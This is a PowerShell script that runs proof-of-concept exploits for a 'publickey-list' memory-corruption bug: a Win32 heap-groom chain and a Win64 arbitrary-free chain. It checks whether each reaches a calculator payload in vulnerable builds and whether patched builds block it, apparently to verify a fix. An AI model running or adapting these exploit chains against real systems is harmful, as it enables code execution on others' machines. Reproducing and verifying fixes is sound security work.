$ErrorActionPreference = "Continue"

$Root = Split-Path -Parent $MyInvocation.MyCommand.Path
$Poc = Join-Path $Root "poc"
Set-Location -LiteralPath $Root

function Show-Matches($text, $patterns) {
    $pattern = [string]::Join("|", $patterns)
    $text | Select-String -Pattern $pattern
}

Remove-Item -LiteralPath (Join-Path $Root "x86_calc_payload_reached.txt") -ErrorAction SilentlyContinue
Remove-Item -LiteralPath (Join-Path $Root "x64_calc_payload_reached.txt") -ErrorAction SilentlyContinue

Write-Output "== Win32 publickey-list calc chain =="
$x86v = Join-Path $Poc "publickey_win32_heap_groom_calc_repro.exe"
$x86c = Join-Path $Poc "publickey_win32_heap_groom_calc_repro_checked.exe"
$x86Args = @("3", "n", "call", "4068")
$hit = 0
$hitOut = $null

for($i = 1; $i -le 30; $i++) {
    $out = & $x86v @x86Args 2>&1
    if($LASTEXITCODE -eq 77) {
        $hit = $i
        $hitOut = $out
        break
    }
}

if($hit) {
    Write-Output "x86_vulnerable_calc=hit attempt=$hit limit=30"
    Show-Matches $hitOut @("attrs_alloc", "victim\[", "marker_function_reached", "calc_launch")
}
else {
    Write-Output "x86_vulnerable_calc=miss limit=30"
}

if(Test-Path (Join-Path $Root "x86_calc_payload_reached.txt")) {
    Get-Content (Join-Path $Root "x86_calc_payload_reached.txt")
}

$checkedHit = 0
for($i = 1; $i -le 30; $i++) {
    & $x86c @x86Args *> $null
    if($LASTEXITCODE -eq 77) {
        $checkedHit = $i
        break
    }
}

if($checkedHit) {
    Write-Output "x86_checked_calc=unexpected_hit attempt=$checkedHit limit=30"
}
else {
    Write-Output "x86_checked_calc=no_hit limit=30"
}

Write-Output ""
Write-Output "== Win64 publickey-list calc chain =="
$x64v = Join-Path $Poc "publickey_win64_arbitrary_free_calc_repro.exe"
$x64c = Join-Path $Poc "publickey_win64_arbitrary_free_calc_repro_checked.exe"
$x64Out = & $x64v calc 2>&1
$x64Exit = $LASTEXITCODE

Write-Output "x64_vulnerable_calc_exit=$x64Exit"
Show-Matches $x64Out @("victim=", "free ptr=", "free_ignored_unknown", "victim_freed=", "same_as_victim=1", "calc_payload_reached", "calc_launch")

if(Test-Path (Join-Path $Root "x64_calc_payload_reached.txt")) {
    Get-Content (Join-Path $Root "x64_calc_payload_reached.txt")
}

$x64CheckedOut = & $x64c calc 2>&1
$x64CheckedExit = $LASTEXITCODE
Write-Output "x64_checked_calc_exit=$x64CheckedExit"
Show-Matches $x64CheckedOut @("victim_freed=", "same_as_victim=", "safe_callback_reached", "calc_payload_reached", "calc_launch")
